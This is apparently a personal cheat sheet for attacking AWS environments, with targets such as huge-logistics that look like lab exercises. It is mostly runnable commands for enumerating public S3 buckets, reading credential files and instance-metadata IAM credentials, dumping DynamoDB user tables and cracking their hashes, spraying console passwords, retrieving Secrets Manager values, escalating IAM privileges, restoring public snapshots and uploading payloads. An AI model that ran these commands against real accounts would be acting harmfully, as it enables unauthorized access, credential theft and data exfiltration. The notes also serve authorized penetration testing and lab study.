🕵️ Enumeration

**Will need to find a way to automatically add profiles when I find AWS Access and Secret Keys!**
```bash
aws configure --profile test   
```

**CloudShell - generate expiring tokens**
```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```

---

🔍 Basic Recon

```bash
host <target-domain>
whois <target-domain>
```

🌐 DNS Enumeration

```bash
dnsenum <domain>
nslookup <domain>
dig <domain> any
```

🌐 Web Page Inspection

Manually inspect source code for:
- `AWSAccessKeyId`, `SecretAccessKey`
- `*.s3.amazonaws.com`
- API endpoints (e.g. `api.<domain>.com`)
- JavaScript files like `main.js`

☁️ cloud_enum
- Install and run: [https://github.com/initstring/cloud_enum](https://github.com/initstring/cloud_enum)
- Example:
	- `python3 cloud_enum.py -k <keyword>`

## 🪣 S3 Bucket Enumeration

```bash
# Unauthenticated
aws s3 ls s3://<bucket-name> --no-sign-request
aws s3 ls s3://<bucket-name>/<folder>/ --no-sign-request --recursive
aws s3 cp s3://<bucket-name>/<folder>/file.zip . --no-sign-request
aws s3api get-bucket-acl --bucket <bucket-name> --no-sign-request
aws s3api list-objects --bucket <bucket-name> --no-sign-request
aws s3api get-bucket-versioning --bucket huge-logistics-dashboard --no-sign-request
aws s3api list-object-versions --bucket huge-logistics-dashboard --query "Versions[?VersionId!='null']" --no-sign-request
aws s3api get-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id "XXXXXXXXXXXXXXXXXXXXXXX" test.xlsx --no-sign-request                            

# Authenticated
aws configure --profile test                         # Use profiles with every `aws` command after configure to manage multiple creds
aws sts get-caller-identity --profile test           # Get Account ID for profile... `whoami` equivalent
aws s3 ls s3://dev.huge-logistics.com/<folder>/ --profile test
aws s3 cp s3://dev.huge-logistics.com/<folder>/ . --recursive --profile test
aws dynamodb list-tables --profile test
aws dynamodb describe-table --table analytics_app_users --profile test
aws dynamodb scan --table-name analytics_app_users --profile test > output.json

# Get the Bucket Policy
aws s3api get-bucket-policy --bucket dev.huge-logistics.com --profile admin | jq -r '.Policy | fromjson'
aws s3api get-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id "XXXXXXXXXXXXXXXXXXXXXXX" test.xlsx --profile admin2
```

**With s3scanner:**

```bash
s3scanner --bucket <bucket-name>
```

**Hashes and password macro:**
```bash
hashid --john <HASH>                       # SHA-256 is promising
grep -r -A 1 'UserID\|PasswordHash' output.json | grep '"S"' | awk -F '"' '{ print $4 }' > user_hash
	username0
	hash0
	username1
	hash1
	...

--- Use vi macro: ---

vi user_hash
# start recording the macro
q
# name the macro "a"
a
# enter insert mode
i
# tap end of line button
End
# type :
:
# tap the delete key
Delete
# tap the down arrow key
down arrow
# exit insert mode
CTRL+C
# stop recording the macro
q

john user_hash --format=Raw-SHA256 --wordlist=/opt/lists/rockyou.txt --fork=4
john user_hash --format=Raw-SHA256 --show
```

**GoAWSConsoleSpray - Spray creds for AWS Dashboard login**
```bash
go install github.com/WhiteOakSecurity/GoAWSConsoleSpray@latest
./GoAWSConsoleSpray -a 243687662613 -u ../../users -p ../../passwords
```

## Leaky Buckets & Public Snapshots

```bash
# Bruteforce leaked bucket owner ID
aws configure                          # Paste the Access key ID & Secret access key
aws sts get-caller-identity            # Get Account ID (427648302155)... `whoami` equivalent
aws sts get-access-key-info --access-key-id <Access_Key>
s3-account-search arn:aws:iam::427648302155:role/LeakyBucket mega-big-tech

# Enumerate the bucket region
curl -I https://mega-big-tech.s3.amazonaws.com

# To list public snapshots, supply owner ID and region:
aws ec2 describe-snapshots --owner-ids 107513503799 --region us-east-1
```
---

## 🗂️ Directory Brute-Forcing

```
feroxbuster -u https://<target> -w /path/to/wordlist
gobuster dir -u https://<target> -w /usr/share/wordlists/dirb/common.txt
dirb https://<target>
```
- GUI: **DirBuster**

---

## 🗃️ Git Repository Exposure

```
curl -s https://<target>/.git/config
```

**Git Secrets:**
```bash
git clone https://github.com/awslabs/git-secrets
cd git-secrets
make install

git clone https://github.com/huge-logistics/cargo-logistics-dev
cd cargo-logistics-dev/
git secrets --install
git secrets --register-aws
git secrets --scan
git secrets --scan-history
git show abcdefg0123456789abcdefg0123456789:log-s3-test/log-upload.php
```

**Trufflehog:**
```bash
pip install trufflehog       # Exegol/docker
brew install trufflehog     # Mac
apt install trufflehog        # Debian

Or:

git clone https://github.com/trufflesecurity/trufflehog/; cd trufflehog
go install

trufflehog git file://cargo-logistics-dev/ --regex --no-entropy
trufflehog git https://github.com/huge-logistics/cargo-logistics-dev --max-depth 2
```

Tools:

- `git-dumper`
- `git-secrets`
- `git-extractor`
- `trufflehog`

---

## 🧾 IAM Credential Hunting

```
cat ~/.aws/credentials
cat ~/.aws/config
```

**From EC2 Instance Metadata Service (IMDS):**

```
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**IAM Brutforce Permissions**
```bash
cd pacu && ./cli.py
> set_keys
> ls
> iam__brutforce_permissions
```

---

## 🔧 System Info from EC2

```
curl http://169.254.169.254/latest/meta-data/iam/info
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
nmcli device show
```

---

## 💥 Exploitation

---

## 🚨 Leaked Credentials

**Export credentials:**

```
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>  # Optional
```

**Verify:**

```
aws sts get-caller-identity
```


---

## 🧠 IAM Privilege Escalation

**Enumerate permissions:**

```bash
go install -v github.com/shabarkin/aws-enumerator@latest
aws-enumerator cred                # Set our keys (saved in `.env`), or `~/go/bin/aws-enumerator cred`. Specify `-aws_region`, `-aws_access_key_id`, `aws_secret_access_key`, and `-aws_session_token`
aws-enumerator enum -services all
aws-enumerator dump -services <service_with_permissions>                         # example is `secretsmanager` with `listsecrets` permission

aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json --profile client-huge       # See above comment
aws secretsmanager get-secret-value --secret-id ext/cost-optimization --profile client-huge

aws iam list-attached-user-policies --user-name ext-cost-user --profile ext-cost
aws iam list-attached-role-policies --role-name ExternalCostOpimizeAccess --profile ext-cost
aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --profile ext-cost
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4 --profile ext-cost
aws iam get-role --role-name ExternalCostOpimizeAccess --profile ext-cost
```

**Simulate permissions:**

```bash
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::<account-id>:user/<user> --action-names <action>
aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --profile -ext-cost
aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --external-id 37911 --profile ext-cost
```

**List access keys:**

```
aws iam list-access-keys --user-name <username>
```

**List Public RDS & EC2 Snapshots:**

```bash
aws rds describe-db-instances
aws rds describe-db-instances --query 'DBInstances[*].PubliclyAccessible' --query 'DBInstances[*].DBInstanceIdentifier'
aws rds describe-db-snapshots --snapshot-type public --include-public --region us-east-1 | grep 104506445608        # grep for AWS Account ID
aws rds describe-db-cluster-snapshots --snapshot-type public --include-public --region us-east-1 | grep 104506445608     # grep for AWS Account ID

aws ec2 describe-snapshots --owner-ids 107513503799 --region us-east-1 --profile ebs
aws ec2 describe-snapshot-attribute --attribute createVolumePermission --snapshot-id snap-0123456789 --region us-east-1 --profile ebs
aws ec2 describe-snapshots --owner-id self --restorable-by-user-ids all --no-paginate --region us-east-1 --profile ebs

# AWS Console > Select Region > RDS Service - Snaphots > Public > Search: "<snapshot_name>" > Restore Snapshot > Restore DB Cluster > Setup EC2 Connection > Select | Create EC2 instance > Continue > Set up > modify cluster > NOW ssh to the EC2 instance (psql in EC2 optionally)
```

**Abuse IAM policies to:**

- Create users
- Attach policies
- Assume roles
- Generate keys

---

## 🛠️ Exploiting S3 Buckets

**Download:**

```
aws s3 cp s3://<bucket-name>/<file> .
```

**Upload:**

```
aws s3 cp payload.sh s3://<bucket-name>/
```

**Exposed MSSQL on S3 Bucket:**

```mysql
nmap -Pn exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com
mysql -h exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com -u <user> -p
# Database commands to check grants
mysql> SHOW GRANTS FOR '<user>';
```


---

## ⚙️ Exploiting Lambda

**List functions:**

```
aws lambda list-functions
```

**Invoke function:**

```
aws lambda invoke --function-name <name> response.json
```

**Get environment variables:**

```
aws lambda get-function-configuration --function-name <name>
```

---

## 🏃 EC2 Privilege Escalation

- Extract IAM credentials via IMDS
- Lateral movement with reused SSH keys or misconfigured services

---

## 📜 CloudTrail Abuse

```
aws cloudtrail lookup-events
```

> ⚠️ If CloudTrail is disabled or misconfigured, activity may not be logged.

---

## 📦 Useful Tools

- `awscli`
- `cloud_enum`
- `s3scanner`
- `git-dumper`
- `gobuster`, `feroxbuster`, `dirb`, `dirbuster`
- `dnsenum`, `host`, `whois`, `dig`
- `nmcli`, `curl`, `jq`

---

## ✅ Tips

- Look for `.env`, `.git`, `config` leaks
- Use `aws sts get-caller-identity` to verify credentials
- On EC2, query `http://169.254.169.254` for metadata
- Don’t ignore Lambda, CloudTrail, or exposed APIs
